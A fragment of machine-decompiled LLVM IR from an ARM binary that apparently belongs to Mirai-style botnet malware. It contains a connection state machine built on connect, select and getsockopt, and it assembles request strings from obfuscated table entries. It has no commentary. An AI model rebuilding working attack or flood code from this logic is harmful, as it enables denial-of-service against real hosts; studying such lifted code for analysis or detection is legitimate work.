  store i32 %stack_var_-20864.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v1_9e84, i32* %r2.global-to-local, align 4
  %v0_86c0 = load i32, i32* @r6, align 4
  %v1_86c0 = add i32 %v0_86c0, -1436
  %v2_86c0 = inttoptr i32 %v1_86c0 to i32*
  %v3_86c0 = load i32, i32* %v2_86c0, align 4
  store i32 %v3_86c0, i32* @r4, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v5_86cc, i32* %r3.global-to-local, align 4
  %v1_86d0 = add i32 %v0_86c0, -1452
  %v2_86d0 = inttoptr i32 %v1_86d0 to i32*
  %v3_86d0 = load i32, i32* %v2_86d0, align 4
  store i32 %v3_86d0, i32* %r0.global-to-local, align 4
  %v3_86e0 = add i32 %v0_86c0, -1448
  %v4_86e0 = inttoptr i32 %v3_86e0 to i8*
  store i8 2, i8* %v4_86e0, align 1
  store i32 %v2_8530, i32* %r3.global-to-local, align 4
  %v0_86ec = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_86ec, i32* %stack_var_-76, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 %v2_86f4, i32* %r1.global-to-local, align 4
  %v1_86f8 = load i32, i32* @r6, align 4
  %v2_86f8 = add i32 %v1_86f8, -1444
  %v3_86f8 = inttoptr i32 %v2_86f8 to i32*
  store i32 %v2_8530, i32* %v3_86f8, align 4
  %v3_86fc = call i32 @__libc_connect(i32 %v3_86d0, i32 %v2_86f4, i32 16)
  store i32 %v3_86fc, i32* %r0.global-to-local, align 4
  %v0_8700 = load i32, i32* @r6, align 4
  %v1_8700 = add i32 %v0_8700, -1452
  %v2_8700 = inttoptr i32 %v1_8700 to i32*
  %v3_8700 = load i32, i32* %v2_8700, align 4
  store i32 %v3_8700, i32* %ip.global-to-local, align 4
  %v3_8708 = udiv i32 %v3_8700, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_870c = mul nuw nsw i32 %v3_8708, 4
  store i32 %v3_870c, i32* %r2.global-to-local, align 4
  store i32 %v2_8710, i32* @lr, align 4
  br label %dec_label_pc_8718

dec_label_pc_8718:                                ; preds = %dec_label_pc_8d00, %dec_label_pc_866c
  %v0_8728 = phi i32 [ %v3_8700, %dec_label_pc_866c ], [ %v3_8d00, %dec_label_pc_8d00 ]
  %v3_870c.pn = phi i32 [ %v3_870c, %dec_label_pc_866c ], [ %v3_8d0c, %dec_label_pc_8d00 ]
  %storemerge = add i32 %v3_870c.pn, %v2_8710
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_8718 = add i32 %storemerge, -292
  %v2_8718 = inttoptr i32 %v1_8718 to i32*
  %v3_8718 = load i32, i32* %v2_8718, align 4
  %v1_871c = urem i32 %v0_8728, 32
  store i32 %v1_871c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_8724 = shl i32 1, %v1_871c
  %v8_8724 = or i32 %v3_8718, %v7_8724
  store i32 %v8_8724, i32* @r1, align 4
  %v1_8728 = load i32, i32* @r8, align 4
  %v2_8728 = sub i32 %v0_8728, %v1_8728
  %v3_8728 = icmp uge i32 %v0_8728, %v1_8728
  store i1 %v3_8728, i1* %cpsr_c.global-to-local, align 1
  %v4_8728 = xor i32 %v1_8728, %v0_8728
  %v5_8728 = xor i32 %v2_8728, %v0_8728
  %v6_8728 = and i32 %v5_8728, %v4_8728
  %v7_8728 = icmp slt i32 %v6_8728, 0
  %v8_8728 = icmp slt i32 %v2_8728, 0
  %v9_8728 = icmp eq i32 %v0_8728, %v1_8728
  store i1 %v9_8728, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8724, i32* %v2_8718, align 4
  %v3_8730 = xor i1 %v8_8728, %v7_8728
  %v4_8730 = or i1 %v9_8728, %v3_8730
  br i1 %v4_8730, label %dec_label_pc_85f4, label %dec_label_pc_8734

dec_label_pc_8734:                                ; preds = %dec_label_pc_8718
  %v0_8734 = load i32, i32* %ip.global-to-local, align 4
  %v1_8734 = load i32, i32* %r3.global-to-local, align 4
  %v2_8734 = add i32 %v1_8734, %v0_8734
  store i32 %v2_8734, i32* @r8, align 4
  br label %dec_label_pc_8738

dec_label_pc_8738:                                ; preds = %dec_label_pc_8fe0, %dec_label_pc_8f8c, %dec_label_pc_8d50, %dec_label_pc_8734
  %v0_875066 = phi i32 [ %v2_8fe0, %dec_label_pc_8fe0 ], [ %v2_8f8c, %dec_label_pc_8f8c ], [ %v2_8d50, %dec_label_pc_8d50 ], [ %v2_8734, %dec_label_pc_8734 ]
  store i32 %v0_839c, i32* %r2.global-to-local, align 4
  %v0_873c = load i32, i32* @r7, align 4
  %v1_873c = add i32 %v0_873c, 1
  store i32 %v1_873c, i32* @r7, align 4
  %v0_8740 = load i32, i32* @r6, align 4
  %v3_8744 = icmp uge i32 %v1_873c, %v0_839c
  store i1 %v3_8744, i1* %cpsr_c.global-to-local, align 1
  %v9_8744 = icmp eq i32 %v1_873c, %v0_839c
  store i1 %v9_8744, i1* %cpsr_z.global-to-local, align 1
  %v1_8748 = add i32 %v0_8740, 3140
  store i32 %v1_8748, i32* @r6, align 4
  br i1 %v9_8744, label %dec_label_pc_8750, label %dec_label_pc_860c

dec_label_pc_8750:                                ; preds = %dec_label_pc_8738, %dec_label_pc_85f4.dec_label_pc_8750_crit_edge
  %v0_8788 = phi i32 [ %v0_8750.pre, %dec_label_pc_85f4.dec_label_pc_8750_crit_edge ], [ %v0_875066, %dec_label_pc_8738 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8750 = icmp eq i32 %v0_8788, 0
  store i1 %v2_8750, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8750, label %dec_label_pc_852c, label %dec_label_pc_8758

dec_label_pc_8758:                                ; preds = %dec_label_pc_8750
  store i32 %v10_82f0, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %stack_var_-60, align 4
  store i32 %v2_8778, i32* %ip.global-to-local, align 4
  store i32 %v2_877c, i32* %r1.global-to-local, align 4
  store i32 %v2_8780, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v0_8788, i32* %r0.global-to-local, align 4
  %v5_8790 = call i32 @__libc_select(i32 %v0_8788, i32 %v2_877c, i32 %v2_8780, i32 0, i32 %v2_8778)
  store i32 %v5_8790, i32* @r4, align 4
  %v0_8798 = load i32, i32* @r5, align 4
  store i32 %v0_8798, i32* %r0.global-to-local, align 4
  %v1_879c = inttoptr i32 %v0_8798 to i32*
  %v2_879c = call i32 @__GI_time(i32* %v1_879c)
  store i32 %v2_879c, i32* %r0.global-to-local, align 4
  %v0_87a0 = load i32, i32* @r4, align 4
  %v1_87a0 = load i32, i32* @r5, align 4
  %v3_87a0 = icmp uge i32 %v0_87a0, %v1_87a0
  store i1 %v3_87a0, i1* %cpsr_c.global-to-local, align 1
  %v9_87a0 = icmp eq i32 %v0_87a0, %v1_87a0
  store i1 %v9_87a0, i1* %cpsr_z.global-to-local, align 1
  %v7_87a8 = icmp sgt i32 %v0_87a0, %v1_87a0
  br i1 %v7_87a8, label %dec_label_pc_87ac, label %dec_label_pc_852c

dec_label_pc_87ac:                                ; preds = %dec_label_pc_8758
  %v0_880c.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_880c

dec_label_pc_87b4:                                ; preds = %dec_label_pc_8820, %dec_label_pc_888c
  %v1_87c4 = phi i32 [ %v1_8838, %dec_label_pc_8820 ], [ %v1_87c4.pre, %dec_label_pc_888c ]
  %v0_87bc = phi i32 [ %v3_8828, %dec_label_pc_8820 ], [ %v0_87bc.pre, %dec_label_pc_888c ]
  store i32 %v2_8710, i32* %r3.global-to-local, align 4
  %v2_87bc = add i32 %v0_87bc, %v2_8710
  store i32 %v2_87bc, i32* %r2.global-to-local, align 4
  %v1_87c0 = add i32 %v2_87bc, -164
  %v2_87c0 = inttoptr i32 %v1_87c0 to i32*
  %v3_87c0 = load i32, i32* %v2_87c0, align 4
  %v2_87c4 = add i32 %v1_87c4, -1
  %v3_87c4 = shl i32 1, %v2_87c4
  %v4_87c4 = and i32 %v3_87c0, %v3_87c4
  %v5_87c4 = icmp ne i32 %v4_87c4, 0
  store i1 %v5_87c4, i1* %cpsr_c.global-to-local, align 1
  %v6_87c4 = ashr i32 %v3_87c0, %v1_87c4
  store i32 %v6_87c4, i32* %r3.global-to-local, align 4
  %v1_87c8 = urem i32 %v6_87c4, 2
  %v2_87c8 = icmp eq i32 %v1_87c8, 0
  store i1 %v2_87c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_87c8, label %dec_label_pc_87ec, label %dec_label_pc_87d0

dec_label_pc_87d0:                                ; preds = %dec_label_pc_87b4
  %v0_87d0 = load i32, i32* @sl, align 4
  %v1_87d0 = add i32 %v0_87d0, -1448
  %v2_87d0 = inttoptr i32 %v1_87d0 to i8*
  %v3_87d0 = load i8, i8* %v2_87d0, align 1
  %v4_87d0 = zext i8 %v3_87d0 to i32
  store i32 %v4_87d0, i32* %r3.global-to-local, align 4
  %v2_87d4 = icmp ugt i8 %v3_87d0, 5
  store i1 %v2_87d4, i1* %cpsr_c.global-to-local, align 1
  %v7_87d4 = icmp eq i8 %v3_87d0, 6
  store i1 %v7_87d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_87d4, label %dec_label_pc_9028, label %dec_label_pc_87dc

dec_label_pc_87dc:                                ; preds = %dec_label_pc_87d0
  %v2_87dc = icmp ugt i8 %v3_87d0, 6
  store i1 %v2_87dc, i1* %cpsr_c.global-to-local, align 1
  %v7_87dc = icmp eq i8 %v3_87d0, 7
  store i1 %v7_87dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_87dc, label %dec_label_pc_8d58, label %dec_label_pc_87e4

dec_label_pc_87e4:                                ; preds = %dec_label_pc_87dc
  %v2_87e4 = icmp ugt i8 %v3_87d0, 9
  store i1 %v2_87e4, i1* %cpsr_c.global-to-local, align 1
  %v7_87e4 = icmp eq i8 %v3_87d0, 10
  store i1 %v7_87e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_87e4, label %dec_label_pc_9660, label %dec_label_pc_87ec

dec_label_pc_87ec:                                ; preds = %dec_label_pc_8e58, %dec_label_pc_96f0, %dec_label_pc_96a0, %dec_label_pc_9078, %dec_label_pc_87e4, %dec_label_pc_87b4, %dec_label_pc_880c, %dec_label_pc_9b40, %dec_label_pc_99ec, %dec_label_pc_9974, %dec_label_pc_9918, %dec_label_pc_96fc, %dec_label_pc_96cc, %dec_label_pc_96b0, %dec_label_pc_9654, %dec_label_pc_9550, %dec_label_pc_8f94
  store i32 %v0_839c, i32* %r3.global-to-local, align 4
  %v1_87f4 = add i32 %stack_var_-20820.0, 1
  store i32 %v1_87f4, i32* %r2.global-to-local, align 4
  %v0_87f8 = load i32, i32* @sl, align 4
  %v3_87fc = icmp uge i32 %v1_87f4, %v0_839c
  store i1 %v3_87fc, i1* %cpsr_c.global-to-local, align 1
  %v9_87fc = icmp eq i32 %v1_87f4, %v0_839c
  store i1 %v9_87fc, i1* %cpsr_z.global-to-local, align 1
  %v1_8804 = add i32 %v0_87f8, 3140
  store i32 %v1_8804, i32* @sl, align 4
  br i1 %v9_87fc, label %dec_label_pc_852c, label %dec_label_pc_880c

dec_label_pc_880c:                                ; preds = %dec_label_pc_87ec, %dec_label_pc_87ac
  %v0_880c = phi i32 [ %v0_880c.pre, %dec_label_pc_87ac ], [ %v1_8804, %dec_label_pc_87ec ]
  %stack_var_-20820.0 = phi i32 [ %v1_87a0, %dec_label_pc_87ac ], [ %v1_87f4, %dec_label_pc_87ec ]
  %v1_880c = add i32 %v0_880c, -1452
  %v2_880c = inttoptr i32 %v1_880c to i32*
  %v3_880c = load i32, i32* %v2_880c, align 4
  store i32 %v3_880c, i32* %r0.global-to-local, align 4
  %v2_8814 = icmp eq i32 %v3_880c, -1
  store i1 %v2_8814, i1* %cpsr_c.global-to-local, align 1
  %v7_8814 = icmp eq i32 %v3_880c, -1
  store i1 %v7_8814, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_880c, i32* %sb.global-to-local, align 4
  br i1 %v7_8814, label %dec_label_pc_87ec, label %dec_label_pc_8820

dec_label_pc_8820:                                ; preds = %dec_label_pc_880c
  %v3_8820 = udiv i32 %v3_880c, 32
  %v3_8828 = mul nuw nsw i32 %v3_8820, 4
  store i32 %v3_8828, i32* @ip, align 4
  store i32 %v2_8710, i32* @lr, align 4
  %v2_8830 = add i32 %v3_8828, %v2_8710
  store i32 %v2_8830, i32* %r2.global-to-local, align 4
  %v1_8834 = add i32 %v2_8830, -292
  %v2_8834 = inttoptr i32 %v1_8834 to i32*
  %v3_8834 = load i32, i32* %v2_8834, align 4
  %v1_8838 = urem i32 %v3_880c, 32
  store i32 %v1_8838, i32* %r1.global-to-local, align 4
  %v2_883c = add nsw i32 %v1_8838, -1
  %v3_883c = shl i32 1, %v2_883c
  %v4_883c = and i32 %v3_8834, %v3_883c
  %v5_883c = icmp ne i32 %v4_883c, 0
  store i1 %v5_883c, i1* %cpsr_c.global-to-local, align 1
  %v6_883c = ashr i32 %v3_8834, %v1_8838
  store i32 %v6_883c, i32* %r3.global-to-local, align 4
  %v1_8840 = urem i32 %v6_883c, 2
  %v2_8840 = icmp eq i32 %v1_8840, 0
  store i1 %v2_8840, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8840, label %dec_label_pc_87b4, label %dec_label_pc_8848

dec_label_pc_8848:                                ; preds = %dec_label_pc_8820
  store i32 %v10_82f0, i32* %ip.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_8860, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-48, align 4
  store i32 4, i32* %stack_var_-52, align 4
  store i32 %v2_886c, i32* @lr, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_8878 = call i32 @getsockopt(i32 %v3_880c, i32 1, i32 4, i32 %v2_8860, i32 %v2_886c)
  store i32 %v10_82f0, i32* @r1, align 4
  %v3_8880 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_8880, i32* %r3.global-to-local, align 4
  %v2_8884 = or i32 %v3_8880, %v5_8878
  store i32 %v2_8884, i32* %r0.global-to-local, align 4
  %v4_8884 = icmp eq i32 %v2_8884, 0
  store i1 %v4_8884, i1* %cpsr_z.global-to-local, align 1
  %v0_888c = load i32, i32* @sl, align 4
  %v1_888c = add i32 %v0_888c, -1452
  %v2_888c = inttoptr i32 %v1_888c to i32*
  %v3_888c = load i32, i32* %v2_888c, align 4
  br i1 %v4_8884, label %dec_label_pc_888c, label %dec_label_pc_8f94

dec_label_pc_888c:                                ; preds = %dec_label_pc_8848
  store i32 %v3_888c, i32* %r3.global-to-local, align 4
  %v3_8890 = udiv i32 %v3_888c, 32
  store i32 %v3_8890, i32* %r2.global-to-local, align 4
  %v1_8894 = urem i32 %v3_888c, 32
  store i32 %v1_8894, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8898 = mul nuw nsw i32 %v3_8890, 4
  store i32 %v3_8898, i32* @ip, align 4
  %v0_889c = load i32, i32* @r4, align 4
  %v1_889c = trunc i32 %v0_889c to i8
  %v3_889c = add i32 %v0_888c, -1448
  %v4_889c = inttoptr i32 %v3_889c to i8*
  store i8 %v1_889c, i8* %v4_889c, align 1
  %v0_87bc.pre = load i32, i32* @ip, align 4
  %v1_87c4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_87b4

dec_label_pc_88a4:                                ; preds = %dec_label_pc_860c
  %v1_88a4 = add i32 %v3_88b0, 4
  %v2_88a4 = inttoptr i32 %v1_88a4 to i32*
  %v3_88a4 = load i32, i32* %v2_88a4, align 4
  store i32 %v3_88a4, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_88a8 = icmp eq i32 %v3_88a4, 0
  store i1 %v2_88a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_88a8, label %.thread20, label %.thread18

.thread18:                                        ; preds = %dec_label_pc_88a4
  store i32 4, i32* @r3, align 4
  store i8 4, i8* %v2_860c, align 1
  %v0_88b4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_88b4.pr.pr, label %.thread18..thread20_crit_edge, label %dec_label_pc_88bc

.thread18..thread20_crit_edge:                    ; preds = %.thread18
  %v1_88b4.pre = load i32, i32* @r3, align 4
  %v3_88b4.pre = load i32, i32* @r6, align 4
  %extract.t = trunc i32 %v1_88b4.pre to i8
  br label %.thread20

.thread20:                                        ; preds = %.thread18..thread20_crit_edge, %dec_label_pc_88a4
  %v3_88b4 = phi i32 [ %v3_88b4.pre, %.thread18..thread20_crit_edge ], [ %v3_88b0, %dec_label_pc_88a4 ]
  %v1_88b4.off0 = phi i8 [ %extract.t, %.thread18..thread20_crit_edge ], [ 0, %dec_label_pc_88a4 ]
  %v4_88b4 = add i32 %v3_88b4, -1448
  %v5_88b4 = inttoptr i32 %v4_88b4 to i8*
  store i8 %v1_88b4.off0, i8* %v5_88b4, align 1
  %v0_88b8.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_88b8.pr, label %.thread20.dec_label_pc_8628_crit_edge, label %dec_label_pc_88bc

.thread20.dec_label_pc_8628_crit_edge:            ; preds = %.thread20
  %v0_8628.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_8628

dec_label_pc_88bc:                                ; preds = %.thread18, %dec_label_pc_85b4, %.thread20
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  %v0_88c4 = load i32, i32* @r5, align 4
  %v1_88c4 = add i32 %v0_88c4, 2112
  store i32 %v1_88c4, i32* %r0.global-to-local, align 4
  %v1_88c8 = load i32, i32* @r6, align 4
  %v2_88c8 = add i32 %v1_88c8, 12
  %v3_88c8 = inttoptr i32 %v2_88c8 to i32*
  store i32 -1, i32* %v3_88c8, align 4
  %v0_88cc = load i32, i32* %r0.global-to-local, align 4
  %v1_88cc = add i32 %v0_88cc, 4
  store i32 %v1_88cc, i32* %r0.global-to-local, align 4
  store i32 1024, i32* %r1.global-to-local, align 4
  %v0_88d4 = load i32, i32* %sb.global-to-local, align 4
  %v1_88d4 = load i32, i32* @r6, align 4
  %v2_88d4 = inttoptr i32 %v1_88d4 to i32*
  store i32 %v0_88d4, i32* %v2_88d4, align 4
  %v2_88d8 = call i32 @util_zero(i32 %v1_88cc, i32 1024)
  store i32 10240, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v0_88e4 = load i32, i32* %sb.global-to-local, align 4
  %v1_88e4 = load i32, i32* @r6, align 4
  %v2_88e4 = add i32 %v1_88e4, 660
  %v3_88e4 = inttoptr i32 %v2_88e4 to i32*
  store i32 %v0_88e4, i32* %v3_88e4, align 4
  %v2_88e8 = call i32 @util_zero(i32 %stack_var_-20860.0.ph, i32 10240)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_88f0 = call i32 @util_strlen(i8* %v1_88f0)
  %v0_88f4 = load i32, i32* @r5, align 4
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  %v1_88fc = add i32 %v0_88f4, 1431
  store i32 %v1_88fc, i32* %fp.global-to-local, align 4
  %v2_8900 = add i32 %v2_88f0, %stack_var_-20860.0.ph
  store i32 %v2_8900, i32* @r0, align 4
  store i32 %v1_88fc, i32* %r1.global-to-local, align 4
  %v2_8908 = inttoptr i32 %v2_8900 to i8*
  %v3_8908 = call i32 @util_strcpy(i8* %v2_8908, i32 %v1_88fc)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8910 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_1a770.38 to i32), i32* %r1.global-to-local, align 4
  %v2_891c = add i32 %v2_8910, %stack_var_-20860.0.ph
  store i32 %v2_891c, i32* @r0, align 4
  %v2_8920 = inttoptr i32 %v2_891c to i8*
  %v3_8920 = call i32 @util_strcpy(i8* %v2_8920, i32 ptrtoint (i32* @global_var_1a770.38 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8928 = call i32 @util_strlen(i8* %v1_88f0)
  %v2_8930 = add i32 %v2_8928, %stack_var_-20860.0.ph
  store i32 %v2_8930, i32* @r0, align 4
  %v0_8934 = load i32, i32* @r5, align 4
  %v1_8934 = add i32 %v0_8934, 532
  store i32 %v1_8934, i32* %r1.global-to-local, align 4
  %v2_8938 = inttoptr i32 %v2_8930 to i8*
  %v3_8938 = call i32 @util_strcpy(i8* %v2_8938, i32 %v1_8934)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8940 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_1a748.40 to i32), i32* %r1.global-to-local, align 4
  %v2_894c = add i32 %v2_8940, %stack_var_-20860.0.ph
  store i32 %v2_894c, i32* @r0, align 4
  %v3_8950 = inttoptr i32 %v2_894c to i8*
  %v4_8950 = call i32 @util_strcpy(i8* %v3_8950, i32 ptrtoint ([24 x i8]* @global_var_1a748.40 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8958 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  %v0_8960 = load i32, i32* @r5, align 4
  %v1_8960 = add i32 %v0_8960, 20
  store i32 %v1_8960, i32* %r1.global-to-local, align 4
  %v2_8964 = add i32 %v2_8958, %stack_var_-20860.0.ph
  store i32 %v2_8964, i32* @r0, align 4
  %v2_8968 = inttoptr i32 %v2_8964 to i8*
  %v3_8968 = call i32 @util_strcpy(i8* %v2_8968, i32 %v1_8960)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8970 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1a760.42 to i32), i32* %r1.global-to-local, align 4
  %v2_897c = add i32 %v2_8970, %stack_var_-20860.0.ph
  store i32 %v2_897c, i32* @r0, align 4
  %v3_8980 = inttoptr i32 %v2_897c to i8*
  %v4_8980 = call i32 @util_strcpy(i8* %v3_8980, i32 ptrtoint ([9 x i8]* @global_var_1a760.42 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8988 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  %v0_8990 = load i32, i32* @r5, align 4
  %v2_8994 = add i32 %v2_8988, %stack_var_-20860.0.ph
  store i32 %v2_8994, i32* @r0, align 4
  %v1_8998 = add i32 %v0_8990, 789
  store i32 %v1_8998, i32* %r1.global-to-local, align 4
  %v2_899c = inttoptr i32 %v2_8994 to i8*
  %v3_899c = call i32 @util_strcpy(i8* %v2_899c, i32 %v1_8998)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_89a4 = call i32 @util_strlen(i8* %v1_88f0)
  %v2_89ac = add i32 %v2_89a4, %stack_var_-20860.0.ph
  store i32 %v2_89ac, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32* %r1.global-to-local, align 4
  %v3_89b4 = inttoptr i32 %v2_89ac to i8*
  %v4_89b4 = call i32 @util_strcpy(i8* %v3_89b4, i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32))
  store i32 39, i32* %r0.global-to-local, align 4
  %v1_89bc = call i32 @table_unlock_val(i32 39)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_89c4 = call i32 @util_strlen(i8* %v1_88f0)
  %v0_89c8 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_89c8, i32* %r1.global-to-local, align 4
  store i32 %v2_89c4, i32* @r4, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v2_89d4 = inttoptr i32 %v0_89c8 to i32*
  %v3_89d4 = call i32 @table_retrieve_val(i32 39, i32* %v2_89d4)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_89d4, i32* %r1.global-to-local, align 4
  %v1_89e0 = load i32, i32* @r4, align 4
  %v2_89e0 = add i32 %v1_89e0, %stack_var_-20860.0.ph
  store i32 %v2_89e0, i32* @r0, align 4
  %v2_89e4 = inttoptr i32 %v2_89e0 to i8*
  %v3_89e4 = call i32 @util_strcpy(i8* %v2_89e4, i32 %v3_89d4)
  store i32 39, i32* %r0.global-to-local, align 4
  %v1_89ec = call i32 @table_lock_val(i32 39)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_89f4 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32* %r1.global-to-local, align 4
  %v2_8a00 = add i32 %v2_89f4, %stack_var_-20860.0.ph
  store i32 %v2_8a00, i32* @r0, align 4
  %v3_8a04 = inttoptr i32 %v2_8a00 to i8*
  %v4_8a04 = call i32 @util_strcpy(i8* %v3_8a04, i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32))
  store i32 40, i32* %r0.global-to-local, align 4
  %v1_8a0c = call i32 @table_unlock_val(i32 40)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a14 = call i32 @util_strlen(i8* %v1_88f0)
  %v0_8a18 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8a18, i32* %r1.global-to-local, align 4
  store i32 %v2_8a14, i32* @r4, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v2_8a24 = inttoptr i32 %v0_8a18 to i32*
  %v3_8a24 = call i32 @table_retrieve_val(i32 40, i32* %v2_8a24)
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v3_8a24, i32* %r1.global-to-local, align 4
  %v1_8a30 = load i32, i32* @r4, align 4
  %v2_8a30 = add i32 %v1_8a30, %stack_var_-20860.0.ph
  store i32 %v2_8a30, i32* @r0, align 4
  %v2_8a34 = inttoptr i32 %v2_8a30 to i8*
  %v3_8a34 = call i32 @util_strcpy(i8* %v2_8a34, i32 %v3_8a24)
  store i32 40, i32* %r0.global-to-local, align 4
  %v1_8a3c = call i32 @table_lock_val(i32 40)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a44 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32* %r1.global-to-local, align 4
  %v2_8a50 = add i32 %v2_8a44, %stack_var_-20860.0.ph
  store i32 %v2_8a50, i32* @r0, align 4
  %v3_8a54 = inttoptr i32 %v2_8a50 to i8*
  %v4_8a54 = call i32 @util_strcpy(i8* %v3_8a54, i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32))
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_8a5c = call i32 @table_unlock_val(i32 41)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a64 = call i32 @util_strlen(i8* %v1_88f0)
  %v0_8a68 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8a68, i32* %r1.global-to-local, align 4
  store i32 %v2_8a64, i32* @r4, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v2_8a74 = inttoptr i32 %v0_8a68 to i32*
  %v3_8a74 = call i32 @table_retrieve_val(i32 41, i32* %v2_8a74)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_8a74, i32* %r1.global-to-local, align 4
  %v1_8a80 = load i32, i32* @r4, align 4
  %v2_8a80 = add i32 %v1_8a80, %stack_var_-20860.0.ph
  store i32 %v2_8a80, i32* @r0, align 4
  %v2_8a84 = inttoptr i32 %v2_8a80 to i8*
  %v3_8a84 = call i32 @util_strcpy(i8* %v2_8a84, i32 %v3_8a74)
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_8a8c = call i32 @table_lock_val(i32 41)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a94 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32* %r1.global-to-local, align 4
  %v2_8aa0 = add i32 %v2_8a94, %stack_var_-20860.0.ph
  store i32 %v2_8aa0, i32* @r0, align 4
  %v3_8aa4 = inttoptr i32 %v2_8aa0 to i8*
  %v4_8aa4 = call i32 @util_strcpy(i8* %v3_8aa4, i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32))
  store i32 %v4_8aa4, i32* %r0.global-to-local, align 4
  store i32 %v6_81fc, i32* %ip.global-to-local, align 4
  %v1_8aac = load i32, i32* %sb.global-to-local, align 4
  %v3_8aac = icmp uge i32 %v6_81fc, %v1_8aac
  store i1 %v3_8aac, i1* %cpsr_c.global-to-local, align 1
  %v9_8aac = icmp eq i32 %v6_81fc, %v1_8aac
